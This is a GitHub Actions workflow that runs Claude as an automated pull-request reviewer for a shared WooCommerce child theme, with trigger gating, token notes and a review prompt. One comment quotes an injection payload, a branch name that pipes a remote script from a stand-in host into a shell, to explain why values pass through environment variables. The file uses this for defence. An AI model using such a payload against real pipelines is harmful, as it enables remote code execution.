name: Claude PR review

# Runs Claude as an automated reviewer. Claude reads README.md and the
# relevant docs/, reviews the diff, and posts findings as a top-level PR comment plus inline comments
# where useful.
#
# Triggers:
#   1. PR opened / ready_for_review / reopened — automatic first review.
#      We deliberately do NOT trigger on `synchronize` (every push). One
#      auto-review per PR keeps API spend predictable on a high-churn
#      branch and avoids noisy duplicate comments.
#   2. `@claude` mention in a PR-thread comment or inline review comment —
#      manual re-trigger after pushing follow-up changes, or for ad-hoc
#      questions. Gated on author_association ∈ {OWNER, MEMBER,
#      COLLABORATOR} so external commenters can't burn the Max account's
#      quota or abuse the bot.
#
# Required secrets:
#   CLAUDE_CODE_OAUTH_TOKEN  — OAuth token from a Claude Pro/Max subscription.
#                              Generate it by running `claude setup-token` in
#                              the Claude Code CLI (logged into the Max
#                              account whose quota this workflow should
#                              consume), then add via Settings → Secrets and
#                              variables → Actions → "New repository secret"
#                              → name: CLAUDE_CODE_OAUTH_TOKEN.
#
#                              The token is tied to the Max account that
#                              generated it — reviews count against that
#                              account's plan limits, not metered API
#                              billing. Tokens expire (currently ~1 year)
#                              and must be rotated; if the holder's
#                              subscription lapses, the action stops
#                              working until a new token is added.
#
#                              To switch to metered API billing instead,
#                              swap `claude_code_oauth_token:
#                              ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}` for
#                              `anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}`
#                              below and add an ANTHROPIC_API_KEY secret.
#
# Fork-PR safety:
#   `pull_request` events from forks do NOT receive repository secrets, so
#   the action no-ops there — fork code can't exfiltrate the OAuth token.
#   `issue_comment` / `pull_request_review_comment` events DO receive
#   secrets (the trigger fires on the base repo, not the fork). The
#   author_association gate in the job `if:` is the mitigation — a fork-PR
#   author who isn't already a collaborator can't trigger the bot at all.

on:
  pull_request:
    types: [opened, ready_for_review, reopened]
  issue_comment:
    types: [created]
  pull_request_review_comment:
    types: [created]

permissions:
  contents: read
  pull-requests: write
  id-token: write

jobs:
  review:
    # Run on:
    #   - new / reopened / ready PRs (drafts skipped — WIP, not at the gate)
    #   - @claude mentions in PR-thread or inline review comments from a
    #     repo collaborator-or-higher. The `issue.pull_request != null`
    #     check excludes stand-alone issue comments. The `user.type != 'Bot'`
    #     check prevents Claude's own progress comments from re-triggering it.
    if: |
      (
        github.event_name == 'pull_request' &&
        github.event.pull_request.draft == false
      ) || (
        github.event_name == 'issue_comment' &&
        github.event.issue.pull_request != null &&
        contains(github.event.comment.body, '@claude') &&
        github.event.comment.user.type != 'Bot' &&
        contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
      ) || (
        github.event_name == 'pull_request_review_comment' &&
        contains(github.event.comment.body, '@claude') &&
        github.event.comment.user.type != 'Bot' &&
        contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
      )
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      # `issue_comment` events fire on the default branch by default, so we
      # have to resolve the PR's head ref ourselves to review the right code.
      # `pull_request` and `pull_request_review_comment` events both carry
      # the full PR object on `github.event.pull_request`.
      - name: Resolve PR number and head ref
        id: pr
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Every value is read through env rather than interpolated into the
          # script. A branch name is attacker-controlled: a PR from a branch
          # called `x"; curl evil.sh | sh; #` used to break straight out of
          # this run block. github.event.pull_request.head.ref is a documented
          # injection vector.
          EVENT_NAME: ${{ github.event_name }}
          REPO: ${{ github.repository }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
        run: |
          set -euo pipefail
          if [[ "$EVENT_NAME" == "issue_comment" ]]; then
            num="$ISSUE_NUMBER"
            ref="$(gh pr view "$num" --repo "$REPO" --json headRefName -q .headRefName)"
          else
            num="$PR_NUMBER"
            ref="$PR_HEAD_REF"
          fi
          {
            echo "number=$num"
            echo "ref=$ref"
          } >> "$GITHUB_OUTPUT"

      - name: Check out PR branch
        uses: actions/checkout@v6
        with:
          fetch-depth: 1
          ref: ${{ steps.pr.outputs.ref }}

      - name: Run Claude code review
        uses: anthropics/claude-code-action@v1
        with:
          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          # Surfaces a tracking comment with progress checkboxes while Claude
          # is reviewing, so reviewers can see it's working instead of
          # wondering if the workflow ran.
          track_progress: true
          prompt: |
            REPO: ${{ github.repository }}
            PR NUMBER: ${{ steps.pr.outputs.number }}

            You are reviewing a pull request in blaze-blocksy, the shared
            Blocksy child theme that every Blaze Commerce client site runs.
            Per-client code lives under clients/<slug>/ and is switched on
            by that client's manifest.json; shared modules live under inc/
            and are gated by feature flags (the manifest "features" key,
            and the opt-in-only "perf" key for inc/perf/). Per-site
            overrides under custom/ ship from the separate
            bc-site-customizations repo and are not tracked here.

            BEFORE REVIEWING — read README.md (architecture, feature flags,
            versioning) and any docs/patterns/*.md or docs/NEW-CLIENT-SETUP.md
            page covering the code the PR touches. If a CLAUDE.md exists at
            the repo root, read it too and treat its rules as binding.

            REVIEW CHECKLIST (in priority order):
              1. Blast radius — a change to shared code (inc/, assets/,
                 functions.php, woocommerce/ templates) reaches every client
                 site. Flag as **Blocking** any change that alters output or
                 behaviour for sites that did not opt in (no feature flag,
                 or a flag that defaults to on for existing manifests),
                 unless the PR says that is intended. Client-specific code
                 belongs under clients/<slug>/, not in shared modules.
              2. Correctness — bugs, edge cases, WooCommerce-specific
                 interactions (cart fragment refresh after AJAX, nonce
                 verification on AJAX endpoints, jQuery + vanilla JS
                 coexistence, hook ordering).
              3. Security — XSS in PHP/JS output (missing esc_html,
                 esc_attr, esc_url, wp_kses), SQL injection (must use
                 $wpdb->prepare with placeholders), unguarded AJAX or REST
                 endpoints (must check_ajax_referer / current_user_can),
                 directory-traversal in includes.
              4. Performance — CSS specificity wars, render-blocking JS,
                 layout shift introduced by new DOM, unnecessary jQuery
                 where vanilla would suffice, N+1 queries in PHP.
              5. Reuse — does this duplicate an existing inc/ module, helper
                 or another client's clients/<slug>/ code? Flag obvious
                 duplication and per-client code that should be a shared,
                 flagged module.
              6. Housekeeping — release-worthy changes need a CHANGELOG.md
                 entry (newest first) and a matching Version bump in
                 style.css; new features need their docs/patterns page or
                 README feature-table row updated. Report these as
                 **Suggestion**, not Blocking.

            OUTPUT STYLE:
              - ONE top-level summary comment grouped by severity:
                **Blocking** / **Suggestion** / **Nit**.
              - Bullets, not paragraphs. Quote `path/to/file.css:42`.
              - Inline comments ONLY for issues that need a specific line
                anchor (missing escape on output, broken CSS selector).
                Do not inline-comment style nits or general remarks.
              - If the diff is clean, post "LGTM" plus one sentence
                summarising what changed. Do NOT invent issues to fill
                space — false positives waste reviewer time.

            The PR branch is already checked out. Use `gh pr diff` for the
            diff, `gh pr view` for metadata, `gh pr comment` for the
            top-level comment, and
            `mcp__github_inline_comment__create_inline_comment`
            (with `confirmed: true`) for inline annotations.

          claude_args: |
            --allowedTools "Read,Glob,Grep,mcp__github_inline_comment__create_inline_comment,Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*),Bash(gh pr checks:*),Bash(gh api:*)"
